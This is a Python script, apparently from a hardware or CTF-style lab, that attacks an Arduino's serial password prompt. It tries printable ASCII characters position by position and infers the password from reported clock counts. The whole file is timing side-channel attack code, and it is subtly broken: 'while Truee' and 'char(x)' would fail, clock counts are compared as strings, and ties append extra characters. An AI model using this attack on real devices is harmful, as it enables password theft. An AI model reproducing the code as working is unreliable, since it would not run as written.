import serial
from time import sleep

def connect():
    data = None
    while(data != b'Enter password:\r\n'):
        arduino = serial.Serial(port='/dev/ttyACM0', baudrate=115200, timeout=1.0)
        sleep(1)
        for tried in range(5):
            data = arduino.readline()
            print(data)
            #if data == b'Enter password:\r\n':
            try: 
                if 'Enter' in data.decode("utf-8"):
                    print("connected !")
                    return arduino
            except:
                pass
            sleep(0.5)
        arduino.close()
    return arduino

def send_slow(msg, delay):
    for i in range(len(msg)):
        arduino.write(bytes(msg[i], 'utf-8'))
        print(msg[i], end='')
        sleep(delay)
    arduino.write(bytes('\n', 'utf-8'))
    print()
    #arduino.flush()

def capture_time():
    while Truee:
        try:
            data = arduino.readline().decode("utf-8")
            print(data)
            if "clocks" in data:
                print(data)
                n = data[data.find("=")+1:data.find(")")]
                print("clocks -> ", n)
                return n
        except:
            pass

def try_breaking():
    # mdp = 8 chars
    password = ''
    charlist = [char(x) for x in range(33, 126+1, 1)] # The password is using ASCII characters taken from the decimal range 33 (!) to 126 (~).
    for n in range(8):
        clocklist = []
        for c in charlist:
            test = password + c*(8-len(password))
            send_slow(test, 0.5)
            ct = capture_time()
            print("clocks = ", ct)
            clocklist.append(ct)
        
        minimum = min(clocklist)
        for idx in range(0, len(clocklist)): # get min idx
            if minimum == clocklist[idx]:
                password += charlist[idx]
        print("password is ", password + '.'*(8-len(password)))


# START
arduino = connect()
try_breaking()

arduino.close()